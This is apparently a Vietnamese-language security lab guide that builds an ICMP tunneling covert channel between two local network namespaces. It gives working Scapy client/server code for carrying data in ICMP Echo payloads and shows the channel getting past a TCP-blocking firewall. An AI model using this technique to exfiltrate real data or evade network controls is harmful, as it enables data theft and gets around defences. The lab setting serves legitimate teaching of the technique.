# HƯỚNG DẪN THỰC HÀNH: LAB 03
## ICMP Tunneling (Covert Channel & Data Exfiltration)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Xây dựng kênh truyền ngầm tuồn dữ liệu (Covert Channel) qua trường payload của gói tin ICMP Echo Request (`Type 8`), nhận gói phản hồi xác nhận (`Type 0`), và chứng minh khả năng vượt qua tường lửa L4 chặn toàn bộ TCP/UDP ports.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Internal Client / Exfiltrator) trên `veth1`
  - `h2`: `10.0.0.2/24` (External C2 Server) trên `veth2`

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

```bash
# Bước 1: Khởi tạo topology mạng và tắt kernel auto-reply trên h2
sudo bash docs/progress/LAB03/scripts/setup_pair.sh

# Bước 2: Khởi chạy ICMP Tunneling Server trên h2 trong background
sudo ip netns exec h2 python3 docs/progress/LAB03/scripts/icmp_server.py > /tmp/tunnel_server.log 2>&1 &
SERVER_PID=$!
sleep 1

# Bước 3: Mở tcpdump trên veth2 để quan sát dữ liệu truyền rõ (cleartext)
sudo ip netns exec h2 tcpdump -i veth2 -nn -A icmp &
TCPDUMP_PID=$!
sleep 1

# Bước 4: Chạy ICMP Client trên h1 để tuồn chuỗi định danh "tainbow"
sudo ip netns exec h1 python3 docs/progress/LAB03/scripts/icmp_client.py

# Bước 5: Kiểm chứng tường lửa L4 chặn TCP nhưng kênh ngầm ICMP vẫn hoạt động
sudo ip netns exec h2 iptables -A INPUT -p tcp -j DROP
# Kiểm tra TCP bị chặn (timeout):
sudo ip netns exec h1 nc -zvw 2 10.0.0.2 80 || echo "[+] TCP bị chặn đúng như kỳ vọng!"
# Kiểm tra ICMP vẫn truyền thông suốt:
sudo ip netns exec h1 python3 docs/progress/LAB03/scripts/icmp_client.py

# Tắt các tiến trình nền
kill $TCPDUMP_PID $SERVER_PID 2>/dev/null || true
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:

```bash
# === 1. TẠO MÔI TRƯỜNG VÀ CẤU HÌNH KERNEL IGNORE ICMP ===
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo ip netns add h1
sudo ip netns add h2
sudo ip link add veth1 type veth peer name veth2
sudo ip link set veth1 netns h1
sudo ip link set veth2 netns h2
sudo ip netns exec h1 ip link set dev lo up
sudo ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
sudo ip netns exec h1 ip link set dev veth1 up
sudo ip netns exec h2 ip link set dev lo up
sudo ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
sudo ip netns exec h2 ip link set dev veth2 up

# Tắt tự phản hồi ICMP của Kernel trên h2 để nhường quyền cho Scapy Server
sudo ip netns exec h2 sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null

# === 2. KHỞI CHẠY USER-SPACE ICMP TUNNEL SERVER TRÊN H2 ===
sudo ip netns exec h2 python3 -c '
from scapy.all import sniff, IP, ICMP, Raw, send
def handle(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        payload = pkt[Raw].load if pkt.haslayer(Raw) else b""
        print(f"[Server] Nhận dữ liệu ngầm: {payload}")
        resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / Raw(load=b"ACK:" + payload)
        send(resp, verbose=0)
print("[+] ICMP Server đang lắng nghe trên h2...")
sniff(iface="veth2", filter="icmp", prn=handle, count=1, timeout=5)
' > /tmp/icmp_server.log 2>&1 &
SERVER_PID=$!
sleep 1

# === 3. CHẠY CLIENT TUỒN DỮ LIỆU TỪ H1 ===
sudo ip netns exec h1 python3 -c '
from scapy.all import IP, ICMP, Raw, sr1
secret = b"tainbow"
print(f"[*] Client gửi dữ liệu bí mật: {secret}")
req = IP(dst="10.0.0.2") / ICMP(type=8, id=0x1337, seq=1) / Raw(load=secret)
resp = sr1(req, iface="veth1", timeout=3, verbose=0)
if resp and resp.haslayer(Raw):
    print(f"[+] Client nhận phản hồi thành công: {resp[Raw].load}")
'

# === 4. XEM KẾT QUẢ VÀ DỌN DẸP ===
wait $SERVER_PID 2>/dev/null || true
echo "=== NHẬT KÝ SERVER ĐÃ GHI NHẬN ==="
cat /tmp/icmp_server.log
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **Server log:** Hiển thị `[Server] Nhận dữ liệu ngầm: b'tainbow'`.
2. **Client output:** Hiển thị `[+] Client nhận phản hồi thành công: b'ACK:tainbow'`.
3. **Bắt gói `tcpdump -A`:** Nhìn rõ chuỗi ASCII `tainbow` và `ACK:tainbow` bên trong payload của gói tin ICMP.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
sudo pkill -f icmp_server 2>/dev/null || true
sudo ip netns exec h2 iptables -F 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -f /tmp/icmp_server.log /tmp/tunnel_server.log
```

